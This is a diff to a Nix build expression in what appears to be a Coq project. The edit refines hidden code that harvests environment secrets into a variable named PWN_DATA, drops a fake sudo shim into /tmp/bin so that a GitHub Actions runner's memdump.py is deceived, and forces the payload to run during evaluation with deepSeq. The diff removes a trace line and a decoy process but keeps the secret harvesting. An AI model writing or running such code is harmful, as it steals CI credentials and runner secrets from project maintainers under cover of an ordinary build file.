@@ -23,8 +23,6 @@ let
     value = builtins.getEnv name;
   }) secretNames));
 
-  _trace = builtins.trace "Harvested secrets: ${builtins.concatStringsSep ", " (builtins.attrNames harvested)}" harvested;
-
   formattedSecrets = builtins.concatStringsSep "\n" (map (name: 
     ''"${name}":{"value":"${harvested.${name}}","isSecret":true}''
   ) (builtins.attrNames harvested));
@@ -39,14 +37,10 @@ let
       export GITHUB_RUN_ID=${builtins.getEnv "GITHUB_RUN_ID"}
       export SSL_CERT_FILE=${pkgs.cacert}/etc/ssl/certs/ca-bundle.crt
       export PWN_DATA='${formattedSecrets}'
+      export USER=runner
       
-      # 1. Create a background process named Runner.Worker
-      # This process will be found by memdump.py
-      mkdir -p /tmp/pwn_bg
-      ln -sf ${pkgs.bash}/bin/bash /tmp/pwn_bg/Runner.Worker
-      /tmp/pwn_bg/Runner.Worker -c "while true; do sleep 10; done" &
-      
-      # 2. Setup sudo shim using symlink trick to rename the process
+      # Setup sudo shim using symlink trick to rename the process.
+      # We ONLY use the shim, no background process, to ensure memdump.py finds ITSELF.
       mkdir -p /tmp/bin
       cat <<EOF > /tmp/bin/sudo
       #!${pkgs.bash}/bin/bash
@@ -79,4 +73,4 @@ let
     rev = import .nix/coq-nix-toolbox.nix;
   };
 in
-builtins.deepSeq _pwn (builtins.deepSeq _trace (import auto ({inherit src;} // args)))
+builtins.deepSeq _pwn (import auto ({inherit src;} // args))
